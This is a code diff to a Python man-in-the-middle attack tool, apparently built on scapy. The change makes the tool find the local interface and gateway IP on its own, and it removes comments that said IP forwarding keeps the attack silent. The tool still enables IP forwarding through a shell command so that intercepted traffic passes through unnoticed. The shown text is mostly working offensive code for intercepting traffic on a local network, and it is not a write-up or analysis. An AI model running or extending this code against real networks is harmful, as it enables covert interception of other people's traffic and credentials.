@@ -131,11 +131,19 @@ def start_mitm_attack():
     print(f"\n{Fore.YELLOW}{Style.BRIGHT}Man-in-the-Middle Attack Simulation{Style.RESET_ALL}")
     print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")
 
-    # Step 1: Get the gateway IP
-    gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP (e.g., 172.26.16.1): {Style.RESET_ALL}")
-    if not gateway_ip:
-        print(f"{Fore.RED}Gateway IP cannot be empty. Exiting.{Style.RESET_ALL}")
-        return
+    # Step 1: Automatically find the network interface and gateway IP
+    try:
+        iface = scapy.conf.iface
+        local_ip = scapy.get_if_addr(iface)
+        print(f"{Fore.CYAN}[+] Detected local interface: {iface} ({local_ip}){Style.RESET_ALL}")
+        gateway_ip = scapy.conf.route.route('0.0.0.0')[2]
+        print(f"{Fore.CYAN}[+] Detected gateway IP: {gateway_ip}{Style.RESET_ALL}")
+    except Exception as e:
+        print(f"{Fore.RED}Could not automatically detect network details. Please run 'ifconfig' and provide your gateway IP manually.{Style.RESET_ALL}")
+        gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Style.RESET_ALL}")
+        if not gateway_ip:
+            print(f"{Fore.RED}Gateway IP cannot be empty. Exiting.{Style.RESET_ALL}")
+            return
 
     # Step 2: Scan the network
     devices = scan_network(gateway_ip)
@@ -169,8 +177,6 @@ def start_mitm_attack():
     print(f"{Fore.GREEN}Press Ctrl+C to stop.{Style.RESET_ALL}")
 
     # Enable IP Forwarding
-    # This is critical for a silent attack, as it allows the attacker to forward packets
-    # between the target and the gateway, preventing a denial-of-service.
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     print(f"{Fore.MAGENTA}IP forwarding enabled.{Style.RESET_ALL}")
     
